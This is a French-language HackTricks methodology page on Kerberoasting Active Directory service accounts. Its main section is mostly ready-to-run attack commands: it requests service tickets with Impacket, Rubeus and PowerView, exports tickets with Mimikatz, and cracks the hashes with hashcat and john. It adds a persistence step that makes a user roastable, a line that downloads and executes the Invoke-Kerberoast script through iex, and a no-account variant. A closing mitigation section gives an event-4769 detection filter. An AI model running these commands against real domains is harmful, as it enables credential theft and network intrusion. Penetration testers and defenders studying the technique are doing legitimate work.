# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Kerberoast

L'objectif de **Kerberoasting** est de collecter des **tickets TGS pour les services qui s'exécutent au nom des comptes d'utilisateurs** dans l'AD, et non des comptes d'ordinateurs. Ainsi, **une partie** de ces tickets TGS sont **cryptés** avec des **clés** dérivées des mots de passe des utilisateurs. Par conséquent, leurs informations d'identification peuvent être **craquées hors ligne**.\
Vous pouvez savoir qu'un **compte utilisateur** est utilisé comme **service** car la propriété **"ServicePrincipalName"** n'est pas nulle.

Par conséquent, pour effectuer Kerberoasting, seul un compte de domaine qui peut demander des TGS est nécessaire, ce qui peut être n'importe qui car aucun privilège spécial n'est requis.

**Vous avez besoin de justificatifs de connexion valides dans le domaine.**

### **Attaque**

{% hint style="warning" %}
Les outils de **Kerberoasting** demandent généralement **le chiffrement RC4** lors de l'exécution de l'attaque et de l'initiation des demandes TGS-REQ. Cela est dû au fait que **RC4 est** [**plus faible**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) et plus facile à craquer hors ligne à l'aide d'outils tels que Hashcat que d'autres algorithmes de chiffrement tels que AES-128 et AES-256.\
Les hachages RC4 (type 23) commencent par **`$krb5tgs$23$*`** tandis que les hachages AES-256 (type 18) commencent par **`$krb5tgs$18$*`**.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Outils multi-fonctionnalités incluant un dump des utilisateurs pouvant être kerberoastés :
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Énumérer les utilisateurs pouvant être victimes de Kerberoasting**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Technique 1: Demander le TGS et le récupérer depuis la mémoire**

Dans cette technique, nous allons demander un Service Ticket (TGS) à un contrôleur de domaine et le récupérer depuis la mémoire d'un utilisateur cible. Le TGS contient le hash du mot de passe du compte de service, que nous pourrons ensuite casser hors ligne.

Voici les étapes à suivre :

1. Identifiez un compte de service vulnérable dans l'Active Directory.
2. Utilisez l'outil `GetUserSPNs.py` pour demander un TGS pour le compte de service. Cet outil est disponible dans le cadre de l'outil Impacket.
3. Une fois que vous avez obtenu le TGS, utilisez l'outil `kirbi2john.py` pour extraire le hash du mot de passe du TGS.
4. Utilisez un outil de craquage de mots de passe, tel que Hashcat, pour casser le hash du mot de passe et récupérer le mot de passe en clair.

Il est important de noter que cette technique nécessite des privilèges d'administrateur sur la machine cible pour extraire le TGS de la mémoire.
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Technique 2: Outils automatiques**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Lorsqu'un TGS est demandé, l'événement Windows `4769 - Une demande de ticket de service Kerberos a été effectuée` est généré.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès dès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Cracking
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistance

Si vous avez **suffisamment de permissions** sur un utilisateur, vous pouvez le rendre **vulnérable au kerberoasting** :
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Vous pouvez trouver des **outils** utiles pour les attaques **kerberoast** ici : [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Si vous rencontrez cette **erreur** depuis Linux : **`Kerberos SessionError: KRB_AP_ERR_SKEW(L'horloge est trop désynchronisée)`**, cela est dû à l'heure locale. Vous devez synchroniser l'hôte avec le DC. Voici quelques options :

* `ntpdate <IP du DC>` - Obsolète depuis Ubuntu 16.04
* `rdate -n <IP du DC>`

### Atténuation

Kerberoast est très furtif s'il est exploitable

* ID d'événement de sécurité 4769 - Une demande de ticket Kerberos a été effectuée
* Étant donné que 4769 est très fréquent, filtrons les résultats :
* Le nom du service ne doit pas être krbtgt
* Le nom du service ne doit pas se terminer par $ (pour filtrer les comptes machines utilisés pour les services)
* Le nom du compte ne doit pas être machine@domain (pour filtrer les demandes provenant des machines)
* Le code d'échec est '0x0' (pour filtrer les échecs, 0x0 signifie succès)
* Plus important encore, le type de chiffrement du ticket est 0x17
* Atténuation :
* Les mots de passe du compte de service doivent être difficiles à deviner (plus de 25 caractères)
* Utilisez des comptes de service gérés (changement automatique du mot de passe périodiquement et gestion déléguée des SPN)
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
## Kerberoast sans compte de domaine

En septembre 2022, une vulnérabilité a été découverte par [Charlie Clark](https://exploit.ph/), les ST (Service Tickets) peuvent être obtenus via une requête KRB_AS_REQ sans avoir à contrôler un compte Active Directory. Si un principal peut s'authentifier sans pré-authentification (comme une attaque AS-REP Roasting), il est possible de l'utiliser pour lancer une requête **KRB_AS_REQ** et tromper la requête pour demander un **ST** au lieu d'un **TGT** chiffré, en modifiant l'attribut **sname** dans la partie req-body de la requête.

La technique est entièrement expliquée dans cet article : [article de blog Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Vous devez fournir une liste d'utilisateurs car nous n'avons pas de compte valide pour interroger le LDAP en utilisant cette technique.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py à partir de la PR #1413](https://github.com/fortra/impacket/pull/1413) :
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus à partir de PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
**Plus d'informations sur le Kerberoasting dans ired.team** [**ici**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**et** [**ici**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**.**

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour créer et **automatiser facilement des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
